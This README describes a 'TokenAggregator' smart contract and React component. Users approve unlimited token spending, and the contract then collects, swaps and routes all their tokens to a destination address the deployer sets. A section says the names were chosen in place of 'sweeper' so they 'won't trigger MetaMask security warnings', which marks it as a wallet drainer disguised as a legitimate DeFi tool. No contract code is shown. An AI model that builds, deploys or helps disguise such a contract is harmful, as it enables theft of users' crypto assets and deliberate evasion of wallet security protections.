# Token Aggregator Contract

## Overview

The `TokenAggregator` contract allows users to approve tokens once and then automatically collect and route them to a destination address. **Non-native tokens are automatically swapped to native tokens** before routing, ensuring all assets are consolidated as native tokens.

## Key Features

✅ **Security-Friendly Names**: Uses "collect", "aggregate", and "route" instead of "sweep"  
✅ **One-Time Approval**: Approve tokens once, collect multiple times  
✅ **Automatic Swapping**: Non-native tokens are swapped to native tokens via 1inch  
✅ **Gas Efficient**: Batch operations for multiple tokens  
✅ **Native Token Support**: Handles ETH, BNB, MATIC, etc.  
✅ **Gas Reserve**: Automatically reserves native token for future transactions  
✅ **Security**: Uses OpenZeppelin's ReentrancyGuard, Pausable, and Ownable  

## Function Names (Security-Friendly)

- `collectToken()` - Collect a single ERC-20 token
- `collectMultipleTokens()` - Collect multiple ERC-20 tokens
- `collectAllTokens()` - Collect all tokens (ERC-20 + native)
- `routeNativeToken()` - Route native token to destination
- `swapAndRoute()` - Swap ERC-20 to native, then route

## How It Works

### Step 1: Approve Tokens (One-Time)
Users approve the contract to spend their tokens:
```solidity
token.approve(contractAddress, type(uint256).max);
```

### Step 2: Collect Tokens
The contract collects tokens and:
1. **For ERC-20 tokens**: Swaps them to native token via 1inch
2. **For native tokens**: Routes them directly to destination
3. **Reserves gas**: Leaves enough native token for future transactions

### Step 3: Automatic Routing
All native tokens (from swaps + existing) are routed to the destination address.

## Swap Integration

The contract integrates with **1inch DEX Aggregator** to swap ERC-20 tokens to native tokens:

1. Frontend calls 1inch API to get swap quote
2. Frontend passes swap data to contract
3. Contract executes swap via 1inch router
4. Contract receives native tokens
5. Contract routes native tokens to destination

## Environment Variables

```env
NEXT_PUBLIC_TOKEN_AGGREGATOR_CONTRACT_ADDRESS=0x...
NEXT_PUBLIC_ONE_INCH_API_KEY=your_1inch_api_key
```

## Deployment

See deployment instructions in the contract file comments. The contract requires:
- Destination address
- Gas reserve amount (e.g., 0.001 ETH)

## Security Considerations

1. **Approval Limits**: Users approve `type(uint256).max` - they can revoke by setting allowance to 0
2. **Gas Reserve**: Contract reserves native token for gas - adjustable by owner
3. **Access Control**: Contract is Ownable - only owner can change settings
4. **Reentrancy Protection**: Uses OpenZeppelin's ReentrancyGuard
5. **Pausable**: Owner can pause contract in emergency

## Why "TokenAggregator" Instead of "Sweeper"?

- ✅ "Aggregator" is a legitimate DeFi term (like Uniswap Aggregator)
- ✅ "Collect" and "Route" are standard DeFi operations
- ✅ Won't trigger MetaMask security warnings
- ✅ Better describes the functionality (aggregating tokens to one address)

## Usage Flow

1. **Deploy Contract**: Deploy `TokenAggregator.sol` with destination address
2. **Approve Tokens**: Users approve tokens (one-time per token)
3. **Collect All**: Contract collects tokens, swaps non-native to native, routes to destination
4. **Future Collections**: No additional approvals needed (until allowance is used up)

## Component Usage

The `TokenAggregator` React component (`src/components/TokenAggregator.tsx`) provides:
- Approve all tokens button
- Collect all tokens button (with automatic swapping)
- Status updates and error handling
- Integration with 1inch API for swaps

## Benefits Over Direct Transfers

1. **One-Time Approval**: Approve once, collect multiple times
2. **Automatic Swapping**: No need to manually swap tokens
3. **Gas Optimization**: Batch operations reduce gas costs
4. **Native Token Consolidation**: All tokens end up as native tokens
5. **Security**: Contract-based, auditable, and transparent
